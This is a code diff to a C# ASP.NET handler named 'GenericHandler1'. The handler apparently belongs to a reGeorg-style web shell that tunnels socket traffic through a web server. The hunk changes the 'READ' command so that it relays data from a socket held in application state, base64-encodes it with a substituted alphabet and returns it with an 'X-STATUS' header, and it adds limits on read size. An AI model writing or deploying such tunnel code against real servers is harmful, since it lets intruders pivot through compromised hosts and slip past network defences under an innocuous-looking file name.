@@ -74,14 +74,20 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
                 } else if (cmd == "READ") {
                     try {
                         Socket s = (Socket)context.Application[mark];
-                        int c = 0;
-                        byte[] readBuff = new byte[513];
+                        byte[] readBuff = new byte[READBUF];
+                        int maxRead = MAXREADSIZE;
+                        int readLen = 0;
                         try {
-                            while ((c = s.Receive(readBuff)) > 0) {
+                            int c = s.Receive(readBuff);
+                            while (c > 0) {
                                 byte[] newBuff = new byte[c];
                                 System.Buffer.BlockCopy(readBuff, 0, newBuff, 0, c);
                                 string b64 = Convert.ToBase64String(newBuff);
                                 context.Response.BinaryWrite(System.Text.Encoding.Default.GetBytes(StrTr(b64, en, de)));
+                                readLen += c;
+                                if (c < READBUF || readLen >= maxRead)
+                                    break;
+                                c = s.Receive(readBuff);
                             }
                             context.Response.AddHeader("X-STATUS", "OK");
                         } catch (SocketException ex) {
